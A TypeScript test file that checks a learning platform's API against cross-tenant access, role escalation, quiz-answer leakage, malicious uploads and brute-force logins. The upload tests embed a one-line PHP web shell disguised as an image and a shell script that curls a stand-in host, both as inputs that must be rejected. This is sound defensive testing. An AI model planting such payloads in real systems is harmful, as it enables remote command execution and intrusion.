import request from 'supertest';
import { beforeEach, describe, expect, it, vi } from 'vitest';

const loginAttempts = vi.hoisted(() => ({ count: 0 }));

const prismaMock = {
  userOrganization: {
    findMany: vi.fn(),
    findFirst: vi.fn(),
    findUnique: vi.fn(),
  },
  enrollment: {
    findUnique: vi.fn(),
  },
  course: {
    findFirst: vi.fn(),
  },
  module: {
    findFirst: vi.fn(),
  },
  quiz: {
    findFirst: vi.fn(),
    findUnique: vi.fn(),
  },
  quizAttempt: {
    count: vi.fn(),
  },
  media: {
    create: vi.fn(),
  },
};

vi.mock('../services/authService', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../services/authService')>();
  return {
    ...actual,
    getSessionFromToken: vi.fn(),
    getUserById: vi.fn(),
  };
});

vi.mock('../repositories/authRepository', () => ({
  findUserByEmail: vi.fn(async () => null),
}));

vi.mock('../utils/redis', () => ({
  getRedis: () => ({
    incr: vi.fn(async () => {
      loginAttempts.count += 1;
      return loginAttempts.count;
    }),
    expire: vi.fn(async () => 1),
    del: vi.fn(async () => 1),
  }),
}));

vi.mock('../prisma', () => ({
  default: () => prismaMock,
}));

vi.mock('../storage', async (importOriginal) => {
  const original = await importOriginal<typeof import('../storage')>();
  return {
    ...original,
    putObject: vi.fn().mockResolvedValue({
      key: 'orgs/org-a/media/media-1/notes.pdf',
      publicUrl: 'http://localhost:9000/learnflow/orgs/org-a/media/media-1/notes.pdf',
    }),
    getPresignedUrl: vi.fn().mockResolvedValue('http://localhost:9000/signed/media.pdf'),
    deleteObjects: vi.fn().mockResolvedValue(undefined),
  };
});

import app from '../server';
import * as authService from '../services/authService';

const now = new Date('2026-08-28T12:00:00.000Z');

const USER_ID = 'user-1';
const ORG_A = 'org-a';
const ORG_B = 'org-b';

function sessionRecord() {
  return {
    id: 'session-1',
    userId: USER_ID,
    tokenHash: 'hash',
    expiresAt: new Date(Date.now() + 3600000),
    revoked: false,
    createdAt: now,
    updatedAt: now,
  };
}

function cookie() {
  return ['learnflow_session=valid-token'];
}

async function authenticateAs(
  role: 'PLATFORM_ADMIN' | 'ORG_ADMIN' | 'INSTRUCTOR' | 'STUDENT',
  options?: { organizationId?: string },
) {
  const organizationId = options?.organizationId ?? ORG_A;

  vi.mocked(authService.getSessionFromToken).mockResolvedValue(sessionRecord());
  vi.mocked(authService.getUserById).mockResolvedValue({
    id: USER_ID,
    name: 'Test User',
    email: `${role.toLowerCase()}@example.com`,
    passwordHash: 'hash',
    emailVerified: true,
    createdAt: now,
    updatedAt: now,
  });

  prismaMock.userOrganization.findMany.mockResolvedValue([
    { role, organizationId, userId: USER_ID },
  ]);
  prismaMock.userOrganization.findFirst.mockImplementation(
    async ({ where }: { where?: { role?: string } }) => {
      if (where?.role === 'PLATFORM_ADMIN') {
        return role === 'PLATFORM_ADMIN' ? { id: 'm-1', role, organizationId, userId: USER_ID } : null;
      }
      if (where?.role === 'ORG_ADMIN') {
        return role === 'ORG_ADMIN' ? { id: 'm-1', role, organizationId, userId: USER_ID } : null;
      }
      return null;
    },
  );
  prismaMock.userOrganization.findUnique.mockImplementation(
    async ({ where }: { where?: { userId_organizationId?: { userId?: string; organizationId?: string } } }) => {
      const membership = where?.userId_organizationId;
      if (!membership) return null;
      if (membership.organizationId === organizationId) {
        return { id: 'm-1', role, organizationId, userId: USER_ID, createdAt: now, updatedAt: now };
      }
      return null;
    },
  );
}

function resetMocks() {
  loginAttempts.count = 0;
  prismaMock.userOrganization.findMany.mockReset();
  prismaMock.userOrganization.findFirst.mockReset();
  prismaMock.userOrganization.findUnique.mockReset();
  prismaMock.enrollment.findUnique.mockReset();
  prismaMock.course.findFirst.mockReset();
  prismaMock.module.findFirst.mockReset();
  prismaMock.quiz.findFirst.mockReset();
  prismaMock.quiz.findUnique.mockReset();
  prismaMock.quizAttempt.count.mockReset();
  prismaMock.media.create.mockReset();
  vi.mocked(authService.getSessionFromToken).mockReset();
  vi.mocked(authService.getUserById).mockReset();
}

describe('security challenge: cross-tenant access (IDOR)', () => {
  beforeEach(() => {
    resetMocks();
  });

  it('returns 403 when a student of one organization accesses another organization', async () => {
    await authenticateAs('STUDENT', { organizationId: ORG_A });

    const res = await request(app)
      .get(`/api/v1/organizations/${ORG_B}/student/courses`)
      .set('Cookie', cookie());

    expect(res.status).toBe(403);
    expect(res.body.error).toBe('ORGANIZATION_ACCESS_DENIED');
  });

  it('returns 403 when trying to read another organization course content', async () => {
    await authenticateAs('STUDENT', { organizationId: ORG_A });

    const res = await request(app)
      .get(`/api/v1/organizations/${ORG_B}/student/courses/course-1`)
      .set('Cookie', cookie());

    expect(res.status).toBe(403);
    expect(res.body.error).toBe('ORGANIZATION_ACCESS_DENIED');
  });
});

describe('security challenge: role escalation', () => {
  beforeEach(() => {
    resetMocks();
  });

  it('returns 403 when a student calls an organization-admin endpoint', async () => {
    await authenticateAs('STUDENT', { organizationId: ORG_A });

    const res = await request(app)
      .post('/api/v1/org/instructors')
      .set('Cookie', cookie())
      .send({ name: 'Hacker', email: 'hacker@example.com' });

    expect(res.status).toBe(403);
    expect(res.body.error).toBe('ORG_ADMIN_REQUIRED');
  });

  it('returns 403 when a platform-admin-only endpoint is called by a student', async () => {
    await authenticateAs('STUDENT', { organizationId: ORG_A });

    const res = await request(app)
      .get('/api/v1/admin/organizations')
      .set('Cookie', cookie());

    expect(res.status).toBe(403);
    expect(res.body.error).toBe('PLATFORM_ADMIN_REQUIRED');
  });

  it('rejects self-registration with the platform-admin role', async () => {
    const res = await request(app)
      .post('/api/v1/auth/register')
      .send({
        name: 'Hacker',
        email: 'admin-wannabe@example.com',
        password: 'SuperSecret123!',
        confirmPassword: 'SuperSecret123!',
        role: 'PLATFORM_ADMIN',
      });

    expect(res.status).toBe(403);
    expect(res.body.error).toBe('ROLE_NOT_ALLOWED');
  });
});

describe('security challenge: quiz answer leakage', () => {
  beforeEach(() => {
    resetMocks();
  });

  it('never exposes correct-answer flags before submission', async () => {
    await authenticateAs('STUDENT', { organizationId: ORG_A });

    prismaMock.course.findFirst.mockResolvedValue({
      id: 'course-1',
      organizationId: ORG_A,
      title: 'Intro Course',
      status: 'PUBLISHED',
    });
    prismaMock.enrollment.findUnique.mockResolvedValue({
      id: 'enr-1',
      userId: USER_ID,
      courseId: 'course-1',
      organizationId: ORG_A,
      status: 'ACTIVE',
      enrolledAt: now,
    });
    prismaMock.module.findFirst.mockResolvedValue({
      id: 'module-1',
      courseId: 'course-1',
      title: 'Module 1',
    });
    prismaMock.quiz.findFirst.mockResolvedValue({
      id: 'quiz-1',
      moduleId: 'module-1',
      title: 'Quiz 1',
      maxAttempts: 2,
    });

    const leakyQuiz = {
      id: 'quiz-1',
      moduleId: 'module-1',
      title: 'Quiz 1',
      description: null,
      timeLimitMinutes: 10,
      passingPercentage: 60,
      maxAttempts: 2,
      order: 1,
      questions: [
        {
          id: 'qst-1',
          questionText: 'What is 1+1?',
          marks: 1,
          order: 1,
          options: [
            { id: 'opt-1', text: '2', order: 1 },
            { id: 'opt-2', text: '3', order: 2, isCorrect: true },
          ],
        },
      ],
    };
    prismaMock.quiz.findUnique.mockResolvedValue(leakyQuiz);
    prismaMock.quizAttempt.count.mockResolvedValue(0);

    const res = await request(app)
      .get(`/api/v1/organizations/${ORG_A}/student/courses/course-1/modules/module-1/quizzes/quiz-1`)
      .set('Cookie', cookie());

    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);

    for (const question of res.body.data.questions) {
      for (const option of question.options) {
        expect(Object.keys(option).sort()).toEqual(['id', 'order', 'text']);
        expect(option).not.toHaveProperty('isCorrect');
      }
    }

    const args = prismaMock.quiz.findUnique.mock.calls[0][0];
    expect(args.include.questions.select).not.toHaveProperty('isCorrect');
    expect(args.include.questions.select).toEqual({
      id: true,
      questionText: true,
      marks: true,
      order: true,
      options: {
        orderBy: { order: 'asc' },
        select: { id: true, text: true, order: true },
      },
    });
  });
});

describe('security challenge: malicious file upload rejection', () => {
  beforeEach(() => {
    resetMocks();
  });

  it('rejects generic binaries served as application/octet-stream', async () => {
    await authenticateAs('INSTRUCTOR', { organizationId: ORG_A });

    const res = await request(app)
      .post(`/api/v1/organizations/${ORG_A}/media`)
      .set('Cookie', cookie())
      .attach('file', Buffer.from('MZ...'), {
        filename: 'installer.exe',
        contentType: 'application/octet-stream',
      });

    expect(res.status).toBe(400);
    expect(res.body.error).toBe('MEDIA_TYPE_NOT_ALLOWED');
  });

  it('rejects a PHP script disguised as an image', async () => {
    await authenticateAs('INSTRUCTOR', { organizationId: ORG_A });

    const res = await request(app)
      .post(`/api/v1/organizations/${ORG_A}/media`)
      .set('Cookie', cookie())
      .attach('file', Buffer.from('<?php system($_GET["c"]); ?>'), {
        filename: 'shell.php',
        contentType: 'image/png',
      });

    expect(res.status).toBe(400);
    expect(res.body.error).toBe('MEDIA_TYPE_NOT_ALLOWED');
  });

  it('rejects a shell script regardless of claimed content type', async () => {
    await authenticateAs('INSTRUCTOR', { organizationId: ORG_A });

    const res = await request(app)
      .post(`/api/v1/organizations/${ORG_A}/media`)
      .set('Cookie', cookie())
      .attach('file', Buffer.from('#!/bin/bash\ncurl evil.sh'), {
        filename: 'payload.sh',
        contentType: 'text/plain',
      });

    expect(res.status).toBe(400);
    expect(res.body.error).toBe('MEDIA_TYPE_NOT_ALLOWED');
  });

  it('rejects a malicious script used as a course thumbnail', async () => {
    await authenticateAs('INSTRUCTOR', { organizationId: ORG_A });

    const res = await request(app)
      .patch(`/api/v1/organizations/${ORG_A}/courses/course-1/thumbnail`)
      .set('Cookie', cookie())
      .attach('thumbnail', Buffer.from('data:image/svg+xml;base64,PHN2Zy8+'), {
        filename: 'backdoor.php',
        contentType: 'image/png',
      });

    expect(res.status).toBe(400);
    expect(res.body.error).toBe('MEDIA_TYPE_NOT_ALLOWED');
  });

  it('allows a legitimate PDF upload from an instructor', async () => {
    await authenticateAs('INSTRUCTOR', { organizationId: ORG_A });
    prismaMock.media.create.mockImplementation(
      async ({ data }: { data: object }) => data,
    );

    const res = await request(app)
      .post(`/api/v1/organizations/${ORG_A}/media`)
      .set('Cookie', cookie())
      .attach('file', Buffer.from('pdf-bytes'), {
        filename: 'notes.pdf',
        contentType: 'application/pdf',
      });

    expect(res.status).toBe(201);
    expect(res.body.success).toBe(true);
    expect(res.body.data.fileName).toBe('notes.pdf');
  });
});

describe('security challenge: brute-force login throttling', () => {
  beforeEach(() => {
    resetMocks();
  });

  it('returns 429 after repeated failed login attempts', async () => {
    for (let attempt = 1; attempt <= 5; attempt += 1) {
      const res = await request(app)
        .post('/api/v1/auth/login')
        .set('X-Forwarded-For', '203.0.113.9')
        .send({ email: 'attacker@example.com', password: 'wrong-password' });
      expect(res.status).toBe(401);
      expect(res.body.error).toBe('INVALID_CREDENTIALS');
    }

    const throttled = await request(app)
      .post('/api/v1/auth/login')
      .set('X-Forwarded-For', '203.0.113.9')
      .send({ email: 'attacker@example.com', password: 'wrong-password' });

    expect(throttled.status).toBe(429);
    expect(throttled.body.error).toBe('TOO_MANY_ATTEMPTS');
  });

  it('does not throttle a fresh client', async () => {
    for (let attempt = 1; attempt <= 3; attempt += 1) {
      const res = await request(app)
        .post('/api/v1/auth/login')
        .set('X-Forwarded-For', '198.51.100.7')
        .send({ email: 'other@example.com', password: 'wrong-password' });
      expect(res.status).toBe(401);
      expect(res.body.error).toBe('INVALID_CREDENTIALS');
    }
  });
});